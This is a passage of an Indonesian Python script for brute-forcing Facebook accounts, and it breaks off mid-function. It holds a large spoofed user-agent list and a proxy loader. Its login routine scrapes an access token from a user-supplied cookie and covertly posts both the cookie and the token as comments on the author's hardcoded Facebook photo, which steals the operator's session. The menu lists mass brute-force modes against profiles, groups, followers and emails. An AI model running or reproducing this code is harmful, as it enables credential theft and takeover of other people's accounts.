  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokia-7.1-safari",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])

for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
#	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
#	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
#	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
#	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
#	pf = f'{A}{B}{C}{D}'
#	if pf in redmi:pass
#	else:redmi.append(pf)
#	A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
#	B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
#	C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
#	mi = f'{A}{B}{C}'
#	if mi in redmi:pass
#	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note '
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	E = f' Mobile Safari/537.36'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F)
try:abcd = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f" [{M}>{P}] Gagal Dump Proxy")
print(' Total New Proxy : '+str(len(abcd)))
print(' Total Useragent : '+str(len(redmi)))
sleep(1)
	
###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n {M}[{P}•{M}]{P} Jangan Gunakan Akun Pribadi {M}!\n {M}[{P}•{M}]{P} Apabila Akun A2F On, Buka Link Dibawah\n {M}[{P}•{M}]{M} https://business.facebook.com/business_locations\n {M}[{P}•{M}]{P} Lalu Masukkan Kode Autentikasi\n {M}[{P}•{M}]{P} Cookie : ")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try: ### --- JANGAN GANTI BOT AUTHOR --- ###
		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		tem      = ('\nSemangat Master @[100013275378835:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://m.facebook.com/photo.php/?fbid=1667011730417990') ### --- JANGAN DI GANTI --- ###
		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"]) ### --- JANGAN DI GANTI --- ###
		#ses.post(f"https://graph.facebook.com/1667011730417990?fields=subscribers&access_token={token}",headers=(cookies=cok) ### --- JANGAN DI GANTI --- ###
		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={cookie}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={token}&access_token={token}",cookies=cok) ### --- JANGAN DI GANTI --- ###
		ses.post(f"https://graph.facebook.com/1667011730417990/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ### --- JANGAN DI GANTI --- ###
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")




def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
	
	
	
###---[ MENU UTAMA ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {P}[{hh}01{P}] BRUTE FORCE PUBLIK     [{hh}07{P}] BRUTE FORCE SEARCH")
	print(f" [{hh}02{P}] BRUTE FORCE MASSAL     [{hh}08{P}] BRUTE FORCE FROM FILE")
	print(f" [{hh}03{P}] BRUTE FORCE FOLLOW     [{hh}09{P}] CHECK RESSULT ACCOUNT")
	print(f" [{hh}04{P}] BRUTE FORCE COMENT     [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE")
	print(f" [{hh}05{P}] BRUTE FORCE GROUP      [{hh}11{P}] CHECK OPTION ACCOUNT")
	print(f" [{hh}06{P}] BRUTE FORCE EMAIL      [{hh}12{P}] LOGOUT ({M}COOKIE{P})")
	ask = input(f' [{hh}>>{P}] CHOOSE : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_search()
	elif ask in ['8','08']:crack_file()
	elif ask in ['9','09']:cek_hasil()
	elif ask in ['10']:cek_akun()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['12']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] Pilih Yang Bener Lah Tolol")
	else:sys.exit(f" [{M}>{P}] Pilih Yang Bener Lah Tolol")


	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	print(' ─────────────────────────────')
	try:ok = os.listdir('CP')
	except:sys.exit(f" [{M}>{P}] Tidak Ada Hasil CP")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}Akun')	
	exc = input(f' [{kk}<{P}] Nomor Yang Akan Di Cek\n Nomor : ')
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = random.choice(redmi)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r [{hh}<{P}] Cek Opsi Checkpoint Telah Selesai')
	


###---[ CEK AKUN AMAN ]---###
def cek_akun():
	sesi , nga = 0 , 0
	no,nom = 0,[]
	print(' ─────────────────────────────')
	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}
	except:print(f' [{M}>{P}] Cookie Invalid');exit()
	try:ok = os.listdir('OK')
